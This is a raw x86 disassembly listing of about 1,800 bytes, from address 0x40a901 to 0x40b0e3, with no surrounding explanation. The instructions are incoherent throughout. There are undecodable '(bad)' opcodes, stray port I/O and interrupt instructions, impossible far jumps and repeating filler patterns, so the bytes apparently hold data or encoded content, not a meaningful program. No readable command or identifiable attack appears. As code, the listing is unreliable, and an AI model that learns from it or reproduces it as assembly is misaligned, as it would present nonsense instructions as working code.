  40a901:	add    BYTE PTR [eax+0x41],al
  40a904:	add    eax,0x40436200
  40a909:	inc    eax
  40a90a:	add    eax,0x79052c62
  40a90f:	inc    esi
  40a910:	inc    eax
  40a911:	sbb    dh,BYTE PTR [eax+edx*2]
  40a914:	je     0x40a89c
  40a916:	std    
  40a917:	les    edx,FWORD PTR [edx]
  40a919:	push   esp
  40a91a:	bound  ecx,QWORD PTR [edi-0x44]
  40a91d:	xor    eax,DWORD PTR [eax+0x2e]
  40a920:	inc    ecx
  40a921:	inc    eax
  40a922:	add    eax,0x41624340
  40a927:	test   BYTE PTR [eax],al
  40a929:	and    eax,0x404043
  40a92e:	add    BYTE PTR ds:0x626210,al
  40a934:	add    eax,0x43404140
  40a939:	inc    eax
  40a93a:	inc    ecx
  40a93b:	add    eax,0x10664062
  40a940:	inc    ebx
  40a941:	bound  eax,QWORD PTR [eax+0x62]
  40a944:	and    BYTE PTR [edi],ah
  40a946:	push   edi
  40a947:	xchg   esp,eax
  40a948:	inc    eax
  40a949:	push   ss
  40a94a:	pusha  
  40a94b:	inc    edi
  40a94c:	xor    al,0xe8
  40a94e:	fadd   DWORD PTR ds:0x2c415240
  40a954:	sub    BYTE PTR [ebp-0x67],al
  40a957:	xchg   BYTE PTR [eax+eax*8+0x0],dl
  40a95b:	dec    eax
  40a95c:	add    eax,0x4041cc
  40a961:	add    BYTE PTR [eax],al
  40a963:	inc    eax
  40a964:	inc    eax
  40a965:	inc    ebx
  40a966:	bound  eax,QWORD PTR [eax]
  40a968:	inc    eax
  40a969:	inc    eax
  40a96a:	add    eax,0x62434162
  40a96f:	inc    eax
  40a970:	js     0x40a982
  40a972:	inc    ecx
  40a973:	add    eax,0x5404325
  40a978:	bound  eax,QWORD PTR [eax+0x40]
  40a97b:	inc    ecx
  40a97c:	inc    ebx
  40a97d:	xchg   ecx,eax
  40a97e:	call   0x2780e376
  40a983:	xor    ch,BYTE PTR [edi+eiz*2]
  40a986:	xor    BYTE PTR [ebx+edx*4+0x40],0x42
  40a98b:	ret    0xd741
  40a98e:	jae    0x40a96e
  40a990:	add    eax,0x3c44c0a0
  40a995:	and    eax,0x436241
  40a99a:	adc    BYTE PTR [eax+0x0],al
  40a99d:	add    eax,0x62410040
  40a9a2:	inc    eax
  40a9a3:	add    BYTE PTR [ebx-0x34],al
  40a9a6:	inc    eax
  40a9a7:	add    eax,0x78434040
  40a9ac:	bound  eax,QWORD PTR [ecx+0x78]
  40a9af:	add    eax,0x62404043
  40a9b4:	enter  0xb869,0x86
  40a9b8:	inc    eax
  40a9b9:	xor    BYTE PTR [eax+0x530cba3],al
  40a9bf:	and    DWORD PTR [edi+0x46],esi
  40a9c2:	and    eax,0x75c7bfbc
  40a9c7:	xchg   edx,eax
  40a9c8:	pop    ds
  40a9c9:	shr    DWORD PTR [edx+0x62],0xbf
  40a9cd:	outs   dx,DWORD PTR ds:[esi]
  40a9ce:	push   es
  40a9cf:	add    eax,0x40817675
  40a9d4:	dec    esp
  40a9d5:	xor    al,0x62
  40a9d7:	xchg   BYTE PTR [ecx+0x40],al
  40a9da:	add    eax,0x43436240
  40a9df:	add    eax,0x62004040
  40a9e4:	inc    eax
  40a9e5:	add    BYTE PTR [ecx+0x40],al
  40a9e8:	inc    ebx
  40a9e9:	test   BYTE PTR ds:0x58054041,ah
  40a9ef:	inc    eax
  40a9f0:	inc    eax
  40a9f1:	bound  eax,QWORD PTR [eax+0x66]
  40a9f4:	inc    ecx
  40a9f5:	inc    eax
  40a9f6:	add    eax,0x63c4e600
  40a9fb:	sub    al,0xc2
  40a9fd:	inc    eax
  40a9fe:	inc    esi
  40a9ff:	aaa    
  40aa00:	jne    0x40aa31
  40aa02:	and    DWORD PTR [esi-0x58],0x669176b8
  40aa09:	dec    ebx
  40aa0a:	push   edx
  40aa0b:	dec    esp
  40aa0c:	adc    BYTE PTR [ecx-0x1f],al
  40aa0f:	add    eax,0x6201c174
  40aa14:	push   esp
  40aa15:	aas    
  40aa16:	cmp    DWORD PTR [esi+0x64fed4c],eax
  40aa1c:	inc    esi
  40aa1d:	(bad)  
  40aa1e:	shr    BYTE PTR [eax+eax*2],1
  40aa21:	lds    eax,FWORD PTR [ebx]
  40aa23:	or     BYTE PTR [eax],al
  40aa25:	add    BYTE PTR [ebx+0x40],al
  40aa28:	bound  eax,QWORD PTR ds:0x25404110
  40aa2e:	add    ah,cl
  40aa30:	inc    ebx
  40aa31:	add    eax,0x40402562
  40aa36:	add    BYTE PTR [eax+0x40],al
  40aa39:	inc    ecx
  40aa3a:	inc    ecx
  40aa3b:	add    eax,0x78434025
  40aa40:	bound  eax,QWORD PTR [eax-0x7c]
  40aa43:	inc    eax
  40aa44:	inc    ecx
  40aa45:	jle    0x40a9e7
  40aa47:	bound  edx,QWORD PTR [eax+0x5200c140]
  40aa4d:	aam    0x4f
  40aa4f:	jl     0x40aa56
  40aa51:	inc    eax
  40aa52:	jb     0x40a9d4
  40aa54:	inc    esi
  40aa55:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  40aa57:	scas   eax,DWORD PTR es:[edi]
  40aa58:	inc    ecx
  40aa59:	inc    eax
  40aa5a:	inc    eax
  40aa5b:	inc    ebx
  40aa5c:	int3   
  40aa5d:	add    BYTE PTR ds:0x56240,al
  40aa63:	inc    ebx
  40aa64:	inc    eax
  40aa65:	inc    eax
  40aa66:	add    BYTE PTR [ecx+0x62],al
  40aa69:	bound  eax,QWORD PTR [eax]
  40aa6b:	int3   
  40aa6c:	inc    eax
  40aa6d:	inc    ebx
  40aa6e:	add    eax,0x43624041
  40aa73:	adc    BYTE PTR [ecx+0x5],al
  40aa76:	inc    eax
  40aa77:	xchg   BYTE PTR [eax-0x3d],dl
  40aa7a:	sub    DWORD PTR [eax+ecx*1],ebp
  40aa7d:	push   0x25
  40aa7f:	and    DWORD PTR [eax+0x4b],eax
  40aa82:	(bad)  
  40aa83:	xor    BYTE PTR [edi],ch
  40aa85:	or     esp,ecx
  40aa87:	pop    DWORD PTR [eax-0x40]
  40aa8a:	aas    
  40aa8b:	jmp    0x3490:0x5b08405
  40aa92:	xor    DWORD PTR [edx+eiz*2-0x58],0x10404362
  40aa9a:	add    eax,0x4158cc40
  40aa9f:	inc    ebx
  40aaa0:	bound  eax,QWORD PTR [ecx+0x40]
  40aaa3:	add    eax,0x4140
  40aaa8:	and    eax,0x40400062
  40aaad:	add    eax,0x84404340
  40aab2:	int3   
  40aab3:	js     0x40aab5
  40aab5:	inc    ecx
  40aab6:	adc    BYTE PTR [edx+0xf],ah
  40aab9:	test   al,0x86
  40aabb:	inc    eax
  40aabc:	sbb    DWORD PTR [edx-0x3],edx
  40aabf:	ins    DWORD PTR es:[edi],dx
  40aac0:	inc    ecx
  40aac1:	or     esp,DWORD PTR [ecx]
  40aac3:	jns    0x40aa86
  40aac5:	xor    edi,0xffffffc0
  40aac8:	daa    
  40aac9:	xor    ecx,DWORD PTR [esi-0x35cdb09b]
  40aacf:	bound  esp,QWORD PTR [ecx]
  40aad1:	bound  eax,QWORD PTR ds:0x41400074
  40aad7:	inc    eax
  40aad8:	inc    ebx
  40aad9:	bound  ax,DWORD PTR ds:0x40434100
  40aae0:	add    eax,0x40054062
  40aae5:	bound  eax,QWORD PTR [ecx+0x40]
  40aae8:	inc    ebx
  40aae9:	inc    eax
  40aaea:	add    eax,0x25405841
  40aaef:	bound  eax,QWORD PTR [eax+0x43]
  40aaf2:	inc    eax
  40aaf3:	adc    bl,al
  40aaf5:	add    DWORD PTR [eax-0x7991033c],eax
  40aafb:	mov    eax,ds:0x4f49433e
  40ab00:	cmp    eax,0xc2403344
  40ab05:	add    esi,DWORD PTR [ecx+0x6f]
  40ab08:	cmp    al,0x62
  40ab0a:	lea    eax,[eax+0x60]
  40ab0d:	add    ebp,esp
  40ab0f:	push   0x48
  40ab11:	jbe    0x40ab18
  40ab13:	inc    eax
  40ab14:	scas   al,BYTE PTR es:[edi]
  40ab15:	add    DWORD PTR ds:0x86241562,0x49775d4c
  40ab1f:	push   esp
  40ab20:	retf   
  40ab21:	inc    esi
  40ab22:	xor    eax,0x40434140
  40ab27:	add    eax,0x43406262
  40ab2c:	inc    ecx
  40ab2d:	adc    BYTE PTR [eax],al
  40ab2f:	inc    eax
  40ab30:	add    eax,0x43000562
  40ab35:	add    BYTE PTR [ecx+0x40],al
  40ab38:	inc    eax
  40ab39:	add    eax,0x400062
  40ab3e:	inc    ebx
  40ab3f:	inc    eax
  40ab40:	js     0x40ab83
  40ab42:	inc    ecx
  40ab43:	bound  eax,QWORD PTR [eax+0x40]
  40ab46:	rol    BYTE PTR ds:0x94b411c7,0x8c
  40ab4d:	inc    eax
  40ab4e:	sub    eax,0x41c9024f
  40ab53:	push   ebp
  40ab54:	add    eax,0xbe056880
  40ab59:	mov    eax,0x40866038
  40ab5e:	rol    bl,0x41
  40ab61:	adc    eax,0x7440c0d8
  40ab66:	sub    DWORD PTR [ecx+0x42a0424d],eax
  40ab6c:	mov    DWORD PTR [eax+0x49],esi
  40ab6f:	mov    edi,0x25054241
  40ab74:	add    eax,0x3ce7c073
  40ab79:	bound  eax,QWORD PTR [eax+0x5]
  40ab7c:	inc    ecx
  40ab7d:	add    BYTE PTR [ebx+0x40],al
  40ab80:	inc    eax
  40ab81:	inc    ecx
  40ab82:	inc    eax
  40ab83:	inc    eax
  40ab84:	bound  eax,QWORD PTR ds:0x5624300
  40ab8a:	add    BYTE PTR [eax+0x40],al
  40ab8d:	add    BYTE PTR [ecx+0x43],al
  40ab90:	add    BYTE PTR [eax+0x41],al
  40ab93:	add    eax,0x40436200
  40ab98:	inc    eax
  40ab99:	add    eax,0x79cb3062
  40ab9e:	xchg   BYTE PTR [edi],bh
  40aba0:	daa    
  40aba1:	add    DWORD PTR [eax-0x54],eax
  40aba4:	ins    DWORD PTR es:[edi],dx
  40aba5:	inc    esi
  40aba6:	sub    eax,0x40426040
  40abab:	sub    al,0x41
  40abad:	xchg   ebp,eax
  40abae:	mov    BYTE PTR [eax-0x3f],al
  40abb1:	add    al,BYTE PTR [eax+0x67]
  40abb4:	push   ebx
  40abb5:	imul   eax,DWORD PTR ds:0x58305140,0x34
  40abbc:	xor    al,0x42
  40abbe:	xchg   BYTE PTR [esp+eax*8+0x6f],cl
  40abc2:	inc    ecx
  40abc3:	inc    eax
  40abc4:	add    eax,0x41624340
  40abc9:	test   BYTE PTR [eax],al
  40abcb:	and    eax,0x404043
  40abd0:	add    BYTE PTR ds:0x626210,al
  40abd6:	add    eax,0x43404140
  40abdb:	inc    eax
  40abdc:	inc    ecx
  40abdd:	add    eax,0x10664062
  40abe2:	inc    ebx
  40abe3:	bound  eax,QWORD PTR [eax+0x1b]
  40abe6:	inc    edi
  40abe7:	xor    BYTE PTR [edi],ch
  40abe9:	inc    eax
  40abea:	jmp    0x40ab6d
  40abec:	inc    eax
  40abed:	pop    esi
  40abee:	and    al,0xb
  40abf0:	xchg   DWORD PTR [eax+0x36],eax
  40abf3:	inc    ebx
  40abf4:	inc    eax
  40abf5:	test   al,0xd6
  40abf7:	inc    esi
  40abf8:	add    eax,0x540459f0
  40abfd:	adc    BYTE PTR [edx],bh
  40abff:	xchg   ebp,eax
  40ac00:	xchg   BYTE PTR [eax-0x3f],al
  40ac03:	xor    eax,0x6da84140
  40ac08:	and    edi,DWORD PTR [edx+0x6e]
  40ac0b:	add    eax,0x4041cc
  40ac10:	add    BYTE PTR [eax],al
  40ac12:	inc    eax
  40ac13:	inc    eax
  40ac14:	inc    ebx
  40ac15:	bound  eax,QWORD PTR [eax]
  40ac17:	inc    eax
  40ac18:	inc    eax
  40ac19:	add    eax,0x62434162
  40ac1e:	inc    eax
  40ac1f:	js     0x40ac31
  40ac21:	inc    ecx
  40ac22:	add    eax,0x5404325
  40ac27:	bound  eax,QWORD PTR [eax+0x40]
  40ac2a:	inc    ecx
  40ac2b:	inc    ebx
  40ac2c:	inc    esp
  40ac2d:	inc    eax
  40ac2e:	push   eax
  40ac2f:	adc    al,BYTE PTR [edx-0x7a]
  40ac32:	mov    al,ds:0x44001c0
  40ac37:	mov    eax,0x237105d0
  40ac3c:	gs push eax
  40ac3e:	int    0x15
  40ac40:	and    BYTE PTR [esi+0x499741c4],al
  40ac46:	push   ecx
  40ac47:	int    0x46
  40ac49:	outs   dx,BYTE PTR ds:[esi]
  40ac4a:	inc    eax
  40ac4b:	rcr    BYTE PTR [ebx-0x6aee3476],0x85
  40ac52:	inc    eax
  40ac53:	es and eax,0x436241
  40ac59:	adc    BYTE PTR [eax+0x0],al
  40ac5c:	add    eax,0x62410040
  40ac61:	inc    eax
  40ac62:	add    BYTE PTR [ebx-0x34],al
  40ac65:	inc    eax
  40ac66:	add    eax,0x78434040
  40ac6b:	bound  eax,QWORD PTR [ecx+0x78]
  40ac6e:	add    eax,0x62404043
  40ac73:	pop    edi
  40ac74:	dec    eax
  40ac75:	dec    eax
  40ac76:	inc    ecx
  40ac77:	jno    0x40ac7e
  40ac79:	inc    eax
  40ac7a:	inc    esi
  40ac7b:	add    ah,BYTE PTR [edx+0xd]
  40ac7e:	push   eax
  40ac7f:	int    0x86
  40ac81:	dec    esp
  40ac82:	shl    BYTE PTR [ebx+edx*8],0xcb
  40ac86:	or     al,0x35
  40ac88:	xor    al,BYTE PTR [eax+0x23]
  40ac8b:	dec    eax
  40ac8c:	xor    al,0x41
  40ac8e:	inc    eax
  40ac8f:	add    eax,0x43436240
  40ac94:	add    eax,0x62004040
  40ac99:	inc    eax
  40ac9a:	add    BYTE PTR [ecx+0x40],al
  40ac9d:	inc    ebx
  40ac9e:	test   BYTE PTR ds:0x58054041,ah
  40aca4:	inc    eax
  40aca5:	inc    eax
  40aca6:	bound  eax,QWORD PTR [eax+0x66]
  40aca9:	inc    ecx
  40acaa:	inc    eax
  40acab:	add    eax,0x46cd4a00
  40acb0:	test   BYTE PTR [eax+0x2a],al
  40acb3:	add    BYTE PTR [ebx+0x7d],ah
  40acb6:	mov    esp,0x65e00596
  40acbb:	adc    al,0x44
  40acbd:	sub    BYTE PTR ds:0x40408667,al
  40acc3:	imul   edx,DWORD PTR [edx+0x63],0x7a2540cb
  40acca:	xor    BYTE PTR [ecx+0x40a0d040],al
  40acd0:	xor    DWORD PTR [ebx+0x34483eef],0x15
  40acd7:	inc    eax
  40acd8:	add    eax,0x9d1b427a
  40acdd:	mov    eax,ds:0x8686f2cb
  40ace2:	mov    ecx,0x40430000
  40ace7:	bound  eax,QWORD PTR ds:0x25404110
  40aced:	add    ah,cl
  40acef:	inc    ebx
  40acf0:	add    eax,0x40402562
  40acf5:	add    BYTE PTR [eax+0x40],al
  40acf8:	inc    ecx
  40acf9:	inc    ecx
  40acfa:	add    eax,0x78434025
  40acff:	bound  eax,QWORD PTR [eax-0x7c]
  40ad02:	inc    eax
  40ad03:	inc    ecx
  40ad04:	arpl   si,si
  40ad06:	pop    ss
  40ad07:	mov    al,ds:0x457a2c41
  40ad0c:	sbb    DWORD PTR [ecx-0x7db9f237],0xaa0640fd
  40ad16:	push   0x404041c9
  40ad1b:	inc    ebx
  40ad1c:	int3   
  40ad1d:	add    BYTE PTR ds:0x56240,al
  40ad23:	inc    ebx
  40ad24:	inc    eax
  40ad25:	inc    eax
  40ad26:	add    BYTE PTR [ecx+0x62],al
  40ad29:	bound  eax,QWORD PTR [eax]
  40ad2b:	int3   
  40ad2c:	inc    eax
  40ad2d:	inc    ebx
  40ad2e:	add    eax,0x43624041
  40ad33:	adc    BYTE PTR [ecx+0x5],al
  40ad36:	inc    eax
  40ad37:	xchg   esp,eax
  40ad38:	add    eax,0x7c07307a
  40ad3d:	dec    eax
  40ad3e:	mov    ah,0x6c
  40ad40:	xchg   bh,bl
  40ad42:	push   ebp
  40ad43:	out    dx,eax
  40ad44:	fwait
  40ad45:	pop    ss
  40ad46:	or     eax,0x407a349c
  40ad4b:	arpl   WORD PTR [edx-0x7ebd9437],dx
  40ad51:	ret    0x8729
  40ad54:	adc    eax,0x5764c63
  40ad59:	jp     0x40ad45
  40ad5b:	inc    esp
  40ad5c:	enter  0xd4c,0x62
  40ad60:	inc    ebx
  40ad61:	inc    eax
  40ad62:	adc    BYTE PTR ds:0x4158cc40,al
  40ad68:	inc    ebx
  40ad69:	bound  eax,QWORD PTR [ecx+0x40]
  40ad6c:	add    eax,0x4140
  40ad71:	and    eax,0x40400062
  40ad76:	add    eax,0x84404340
  40ad7b:	int3   
  40ad7c:	js     0x40ad7e
  40ad7e:	inc    ecx
  40ad7f:	adc    BYTE PTR [edx+0xf],ah
  40ad82:	(bad)  
  40ad83:	xchg   BYTE PTR [ecx+esi*1],al
  40ad86:	mov    ss,WORD PTR [edx]
  40ad88:	ret    0xbcb
  40ad8b:	sub    DWORD PTR [edx+0x42],edi
  40ad8e:	xor    al,bh
  40ad90:	xor    eax,0x5d802411
  40ad95:	sub    DWORD PTR [eax-0x72],esp
  40ad98:	arpl   WORD PTR [esp+edx*2],si
  40ad9b:	add    eax,0x8a0f217a
  40ada0:	push   edx
  40ada1:	dec    esp
  40ada2:	outs   dx,BYTE PTR ds:[esi]
  40ada3:	xchg   BYTE PTR [esi+0x40],dl
  40ada6:	pop    eax
  40ada7:	test   al,0x54
  40ada9:	add    eax,0x41400046
  40adae:	inc    eax
  40adaf:	inc    ebx
  40adb0:	bound  ax,DWORD PTR ds:0x40434100
  40adb7:	add    eax,0x40054062
  40adbc:	bound  eax,QWORD PTR [ecx+0x40]
  40adbf:	inc    ebx
  40adc0:	inc    eax
  40adc1:	add    eax,0x25405841
  40adc6:	bound  eax,QWORD PTR [eax+0x43]
  40adc9:	inc    eax
  40adca:	adc    BYTE PTR [edi],ah
  40adcc:	jp     0x40ae03
  40adce:	xchg   cl,dl
  40add0:	mov    ecx,0x51ff957b
  40add5:	inc    eax
  40add6:	outs   dx,DWORD PTR ds:[esi]
  40add7:	popa   
  40add8:	push   0xffffffb4
  40adda:	les    eax,FWORD PTR ds:0x9670327a
  40ade0:	dec    esp
  40ade1:	add    eax,0xd3478660
  40ade6:	les    ebp,FWORD PTR [eax-0x19]
  40ade9:	retf   
  40adea:	add    eax,0x6f427a28
  40adef:	dec    ebp
  40adf0:	fnstsw WORD PTR [edi+0x2940fe63]
  40adf6:	inc    eax
  40adf7:	inc    ecx
  40adf8:	inc    ebx
  40adf9:	inc    eax
  40adfa:	add    eax,0x43406262
  40adff:	inc    ecx
  40ae00:	adc    BYTE PTR [eax],al
  40ae02:	inc    eax
  40ae03:	add    eax,0x43000562
  40ae08:	add    BYTE PTR [ecx+0x40],al
  40ae0b:	inc    eax
  40ae0c:	add    eax,0x400062
  40ae11:	inc    ebx
  40ae12:	inc    eax
  40ae13:	js     0x40ae56
  40ae15:	inc    ecx
  40ae16:	bound  eax,QWORD PTR [eax-0x66]
  40ae19:	push   ebx
  40ae1a:	out    dx,al
  40ae1b:	mov    edi,0xe27905f1
  40ae20:	ins    BYTE PTR es:[edi],dx
  40ae21:	lods   al,BYTE PTR ds:[esi]
  40ae22:	sar    BYTE PTR [edi+0x4bb786a9],1
  40ae28:	ror    BYTE PTR [edi],0xa8
  40ae2b:	pop    ecx
  40ae2c:	and    BYTE PTR [ecx+edi*2],dh
  40ae2f:	inc    eax
  40ae30:	jg     0x40ae92
  40ae32:	add    eax,0xb0fd52a9
  40ae37:	and    eax,0xb4cbd240
  40ae3c:	ret    0x7905
  40ae3f:	dec    ecx
  40ae40:	xor    edi,DWORD PTR [edi+eax*8-0x5a7956eb]
  40ae47:	inc    edx
  40ae48:	retf   
  40ae49:	inc    eax
  40ae4a:	iret   
  40ae4b:	bound  eax,QWORD PTR [eax+0x5]
  40ae4e:	inc    ecx
  40ae4f:	add    BYTE PTR [ebx+0x40],al
  40ae52:	inc    eax
  40ae53:	inc    ecx
  40ae54:	inc    eax
  40ae55:	inc    eax
  40ae56:	bound  eax,QWORD PTR ds:0x5624300
  40ae5c:	add    BYTE PTR [eax+0x40],al
  40ae5f:	add    BYTE PTR [ecx+0x43],al
  40ae62:	add    BYTE PTR [eax+0x41],al
  40ae65:	add    eax,0x40436200
  40ae6a:	inc    eax
  40ae6b:	add    eax,0x29b8c962
  40ae70:	jns    0x40aea8
  40ae72:	ror    DWORD PTR [eax+0x65],0x42
  40ae76:	scas   eax,DWORD PTR es:[edi]
  40ae77:	cld    
  40ae78:	lahf   
  40ae79:	xlat   BYTE PTR ds:[ebx]
  40ae7a:	stc    
  40ae7b:	inc    eax
  40ae7c:	mov    dl,0x41
  40ae7e:	inc    ebx
  40ae7f:	add    eax,0x40c14079
  40ae84:	cmp    BYTE PTR [ebx+eax*2],dl
  40ae87:	xchg   BYTE PTR [ecx+0x40],al
  40ae8a:	add    eax,0x41624340
  40ae8f:	test   BYTE PTR [eax],al
  40ae91:	and    eax,0x404043
  40ae96:	add    BYTE PTR ds:0x626210,al
  40ae9c:	add    eax,0x43404140
  40aea1:	inc    eax
  40aea2:	inc    ecx
  40aea3:	add    eax,0x10664062
  40aea8:	inc    ebx
  40aea9:	bound  edx,QWORD PTR [esi+0x62404960]
  40aeaf:	int    0x50
  40aeb1:	aaa    
  40aeb2:	jns    0x40af1f
  40aeb4:	ror    BYTE PTR [eax-0x54],0xb4
  40aeb8:	inc    esi
  40aeb9:	sti    
  40aeba:	mov    al,BYTE PTR [edx+0x29]
  40aebd:	inc    eax
  40aebe:	or     eax,0x7905fc0d
  40aec3:	adc    dh,cl
  40aec5:	inc    eax
  40aec6:	retf   
  40aec7:	retf   
  40aec8:	push   0x8bea8486
  40aecd:	ins    DWORD PTR es:[edi],dx
  40aece:	jae    0x40ae80
  40aed0:	lods   al,BYTE PTR ds:[esi]
  40aed1:	and    DWORD PTR [ecx-0x23],edi
  40aed4:	rol    DWORD PTR [edx-0x21],0x5
  40aed8:	ret    
  40aed9:	cli    
  40aeda:	dec    ecx
  40aedb:	dec    esp
  40aedc:	inc    ecx
  40aedd:	scas   eax,DWORD PTR es:[edi]
  40aede:	dec    esp
  40aedf:	inc    ebx
  40aee0:	dec    esi
  40aee1:	add    eax,0x41cc0579
  40aee6:	inc    eax
  40aee7:	add    BYTE PTR [eax],al
  40aee9:	add    BYTE PTR [eax+0x40],al
  40aeec:	inc    ebx
  40aeed:	bound  eax,QWORD PTR [eax]
  40aeef:	inc    eax
  40aef0:	inc    eax
  40aef1:	add    eax,0x62434162
  40aef6:	inc    eax
  40aef7:	js     0x40af09
  40aef9:	inc    ecx
  40aefa:	add    eax,0x5404325
  40aeff:	bound  eax,QWORD PTR [eax+0x40]
  40af02:	inc    ecx
  40af03:	inc    ebx
  40af04:	(bad)  
  40af05:	ror    ch,0x11
  40af08:	inc    esp
  40af09:	xchg   BYTE PTR ds:[eax+0x63],al
  40af0d:	xor    eax,0x6964441a
  40af12:	xor    edi,DWORD PTR [eax+0x45]
  40af15:	inc    esi
  40af16:	inc    ebp
  40af17:	sub    al,BYTE PTR [eax+0x71]
  40af1a:	stc    
  40af1b:	mov    bh,0x65
  40af1d:	rcr    BYTE PTR [edi+0x5a04c70],0x78
  40af24:	inc    eax
  40af25:	pusha  
  40af26:	pop    ebx
  40af27:	add    ch,BYTE PTR [esp+eiz*2]
  40af2a:	xchg   BYTE PTR [eax-0x367ca5d8],dh
  40af30:	pushf  
  40af31:	sbb    esi,DWORD PTR ds:0x43624125
  40af37:	add    BYTE PTR [eax],dl
  40af39:	inc    eax
  40af3a:	add    BYTE PTR ds:0x62410040,al
  40af40:	inc    eax
  40af41:	add    BYTE PTR [ebx-0x34],al
  40af44:	inc    eax
  40af45:	add    eax,0x78434040
  40af4a:	bound  eax,QWORD PTR [ecx+0x78]
  40af4d:	add    eax,0x62404043
  40af52:	js     0x40afc1
  40af54:	ror    DWORD PTR [eax+esi*4-0xc],0xa8
  40af59:	clc    
  40af5a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40af5b:	inc    eax
  40af5c:	push   ebp
  40af5d:	into   
  40af5e:	inc    ecx
  40af5f:	push   ebx
  40af60:	dec    esi
  40af61:	add    eax,0xe1c22478
  40af66:	inc    esp
  40af67:	(bad)  
  40af68:	xchg   BYTE PTR ds:[ecx-0x370b4c9d],ah
  40af6f:	dec    esi
  40af70:	leave  
  40af71:	inc    eax
  40af72:	js     0x40afb4
  40af74:	xchg   esi,eax
  40af75:	dec    ebx
  40af76:	je     0x40afb9
  40af78:	inc    eax
  40af79:	add    eax,0x43436240
  40af7e:	add    eax,0x62004040
  40af83:	inc    eax
  40af84:	add    BYTE PTR [ecx+0x40],al
  40af87:	inc    ebx
  40af88:	test   BYTE PTR ds:0x58054041,ah
  40af8e:	inc    eax
  40af8f:	inc    eax
  40af90:	bound  eax,QWORD PTR [eax+0x66]
  40af93:	inc    ecx
  40af94:	inc    eax
  40af95:	add    eax,0xbe884800
  40af9a:	nop
  40af9b:	cmc    
  40af9c:	inc    eax
  40af9d:	dec    BYTE PTR [eax]
  40af9f:	imul   ebp,DWORD PTR [esi],0x5
  40afa2:	js     0x40afdb
  40afa4:	xor    esi,DWORD PTR [edi-0x37]
  40afa7:	inc    esp
  40afa8:	test   BYTE PTR [esi+0x6a2a6383],al
  40afae:	mov    esp,0x2d6238
  40afb3:	add    BYTE PTR [ebx+0x40],al
  40afb6:	bound  eax,QWORD PTR ds:0x25404110
  40afbc:	add    ah,cl
  40afbe:	inc    ebx
  40afbf:	add    eax,0x40402562
  40afc4:	add    BYTE PTR [eax+0x40],al
  40afc7:	inc    ecx
  40afc8:	inc    ecx
  40afc9:	add    eax,0x78434025
  40afce:	bound  eax,QWORD PTR [eax-0x7c]
  40afd1:	inc    eax
  40afd2:	inc    ecx
  40afd3:	js     0x40b015
  40afd5:	les    ebp,FWORD PTR [edi]
  40afd7:	inc    ecx
  40afd8:	jnp    0x40afec
  40afda:	mov    ebp,0x6ba932e2
  40afdf:	inc    ebp
  40afe0:	xor    BYTE PTR [eax],ah
  40afe2:	add    eax,0xd4345778
  40afe7:	enter  0x4fa9,0x86
  40afeb:	iret   
  40afec:	inc    eax
  40afed:	rcr    BYTE PTR ds:0x41350152,0x40
  40aff4:	inc    eax
  40aff5:	inc    ebx
  40aff6:	int3   
  40aff7:	add    BYTE PTR ds:0x56240,al
  40affd:	inc    ebx
  40affe:	inc    eax
  40afff:	inc    eax
  40b000:	add    BYTE PTR [ecx+0x62],al
  40b003:	bound  eax,QWORD PTR [eax]
  40b005:	int3   
  40b006:	inc    eax
  40b007:	inc    ebx
  40b008:	add    eax,0x43624041
  40b00d:	adc    BYTE PTR [ecx+0x5],al
  40b010:	inc    eax
  40b011:	das    
  40b012:	js     0x40b038
  40b014:	adc    DWORD PTR [eax],ebp
  40b016:	cmp    BYTE PTR fs:[esi],ah
  40b019:	mov    esp,0x5b40793c
  40b01e:	(bad)  [edx+edi*1-0xbd87fb]
  40b025:	inc    edx
  40b026:	pop    eax
  40b027:	xor    BYTE PTR [ebx-0x7a],ah
  40b02a:	xor    ah,BYTE PTR [edx]
  40b02c:	push   0x86e9ab84
  40b031:	and    edi,DWORD PTR [eax+0x5f]
  40b034:	pop    edx
  40b035:	and    DWORD PTR [eax+0x62],ebp
  40b038:	inc    ebx
  40b039:	inc    eax
  40b03a:	adc    BYTE PTR ds:0x4158cc40,al
  40b040:	inc    ebx
  40b041:	bound  eax,QWORD PTR [ecx+0x40]
  40b044:	add    eax,0x4140
  40b049:	and    eax,0x40400062
  40b04e:	add    eax,0x84404340
  40b053:	int3   
  40b054:	js     0x40b056
  40b056:	inc    ecx
  40b057:	adc    BYTE PTR [edx+0xf],ah
  40b05a:	dec    esp
  40b05b:	xchg   esp,eax
  40b05c:	mov    ebx,0xac14225
  40b061:	adc    DWORD PTR [esp+eiz*2+0x5],eax
  40b065:	js     0x40b07c
  40b067:	inc    edi
  40b068:	clc    
  40b069:	leave  
  40b06a:	ins    DWORD PTR es:[edi],dx
  40b06b:	dec    ecx
  40b06c:	xchg   BYTE PTR [ebx],cl
  40b06e:	cmp    al,al
  40b070:	repz mov al,0xcb
  40b073:	xor    al,0x6e
  40b075:	js     0x40b0b7
  40b077:	xor    al,0x26
  40b079:	inc    ebx
  40b07a:	mov    edi,0x414000e1
  40b07f:	inc    eax
  40b080:	inc    ebx
  40b081:	bound  ax,DWORD PTR ds:0x40434100
  40b088:	add    eax,0x40054062
  40b08d:	bound  eax,QWORD PTR [ecx+0x40]
  40b090:	inc    ebx
  40b091:	inc    eax
  40b092:	add    eax,0x25405841
  40b097:	bound  eax,QWORD PTR [eax+0x43]
  40b09a:	inc    eax
  40b09b:	adc    BYTE PTR [edx+0x3a98307b],bh
  40b0a1:	inc    esp
  40b0a2:	mov    edi,0x407805a8
  40b0a7:	ret    
  40b0a8:	outs   dx,BYTE PTR ds:[esi]
  40b0a9:	enter  0x100a,0x86
  40b0ad:	pop    ebx
  40b0ae:	jae    0x40b0f0
  40b0b0:	inc    ecx
  40b0b1:	inc    ebx
  40b0b2:	inc    eax
  40b0b3:	add    eax,0x43406262
  40b0b8:	inc    ecx
  40b0b9:	adc    BYTE PTR [eax],al
  40b0bb:	inc    eax
  40b0bc:	add    eax,0x43000562
  40b0c1:	add    BYTE PTR [ecx+0x40],al
  40b0c4:	inc    eax
  40b0c5:	add    eax,0x400062
  40b0ca:	inc    ebx
  40b0cb:	inc    eax
  40b0cc:	js     0x40b10f
  40b0ce:	inc    ecx
  40b0cf:	bound  eax,QWORD PTR [eax+0x40]
  40b0d2:	arpl   WORD PTR [edx+eiz*1-0x4c],bp
  40b0d6:	and    DWORD PTR [eax+0x40],edi
  40b0d9:	rcr    BYTE PTR [ecx-0x46be57fe],0x51
  40b0e0:	jno    0x40b115
  40b0e2:	daa    
  40b0e3:	leave  
